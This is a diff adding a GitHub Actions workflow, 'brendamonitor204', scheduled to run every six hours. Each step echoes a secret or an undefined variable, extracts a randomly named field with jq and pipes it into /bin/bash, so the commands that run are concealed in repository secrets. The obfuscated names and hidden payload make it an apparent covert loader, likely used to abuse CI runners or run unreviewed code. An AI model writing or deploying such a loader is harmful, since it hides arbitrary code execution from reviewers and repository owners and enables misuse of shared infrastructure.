@@ -1,0 +1,25 @@
+name: brendamonitor204
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: brendamonitor204
+        env:
+          ys2: ${{ secrets.ys2 }}
+        run: |
+          echo $ys2 | jq -r .po9 | /bin/bash
+          echo $xdy2150 | jq -r .gf1253 | /bin/bash
+          echo $q9706 | jq -r .nptrn38802 | /bin/bash
+          echo $mck0628 | jq -r .zrt177 | /bin/bash
+          echo $ihdhj7 | jq -r .uusxb23646 | /bin/bash
+          echo $hjsh378 | jq -r .tky67171 | /bin/bash
+          echo $rytae36 | jq -r .lj26814 | /bin/bash
+
